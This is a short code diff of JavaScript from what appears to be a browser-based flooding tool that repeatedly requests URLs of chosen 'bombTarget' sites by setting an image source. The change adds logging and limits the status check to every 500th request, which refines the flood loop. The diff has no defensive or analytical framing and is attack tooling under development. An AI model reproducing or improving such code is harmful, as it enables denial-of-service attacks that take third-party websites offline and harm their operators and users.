@@ -4,10 +4,11 @@
 	const intervals = {};
 
 	const statusCheck = (url) => {
+		console.log('start check !!!!!')
 		const myRequest = new Request(url);
 
 		fetch(myRequest).then(function(response) {
-			console.log(response.status); // returns 200
+			console.log('status check', response.status); // returns 200
 		});
 	}
 
@@ -30,7 +31,9 @@
 		image.src = url;
 		targets[bombTarget].requested += 1;
 
-		statusCheck(url);
+		if (targets[bombTarget].requested % 500 === 0) {
+			statusCheck(url);
+		}
 	}
 
 	
